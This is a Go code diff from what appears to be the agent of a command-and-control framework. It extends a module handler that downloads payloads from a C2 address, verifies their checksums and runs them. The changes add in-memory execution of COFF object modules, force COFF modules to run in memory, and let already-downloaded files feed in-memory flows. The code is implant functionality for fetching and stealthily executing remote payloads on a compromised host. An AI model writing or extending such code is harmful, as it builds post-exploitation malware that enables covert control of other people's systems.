@@ -28,6 +28,12 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	modDir := filepath.Join(common.RuntimeConfig.AgentRoot, modName)
 	var err error
 
+	env = normalizeEnv(env)
+
+	if payload_type == "coff" && !inMem {
+		return logging.Sprintf("COFF modules must run in memory; set in_memory=true in agent_config")
+	}
+
 	// download and verify module file
 	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
 	if downloadErr != nil {
@@ -87,6 +93,12 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 			}
 			return out
 		}
+	case "coff":
+		out, err := runCOFFModule(payload_data, env)
+		if err != nil {
+			return logging.Sprintf("running COFF module: %v", err)
+		}
+		return out
 	case "elf":
 		if inMem {
 			outChan := make(chan string)
@@ -140,6 +152,18 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	return out
 }
 
+func normalizeEnv(env []string) []string {
+	clean := make([]string, 0, len(env))
+	for _, entry := range env {
+		e := strings.TrimSpace(entry)
+		if e == "" {
+			continue
+		}
+		clean = append(clean, e)
+	}
+	return clean
+}
+
 func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
 	// Create agent root if not exist
 	if !util.IsDirExist(common.RuntimeConfig.AgentRoot) {
@@ -172,6 +196,11 @@ func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (
 	if crypto.SHA256SumFile(file_to_download) != checksum {
 		if data, err = c2transport.FetchFile(download_addr, file_to_download, "", checksum); err != nil {
 			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
+		}
+	} else {
+		// checksum already matches local file; read it so callers can run in-memory flows
+		if data, err = os.ReadFile(file_to_download); err != nil {
+			return nil, fmt.Errorf("reading %s: %v", file_to_download, err)
 		}
 	}
 
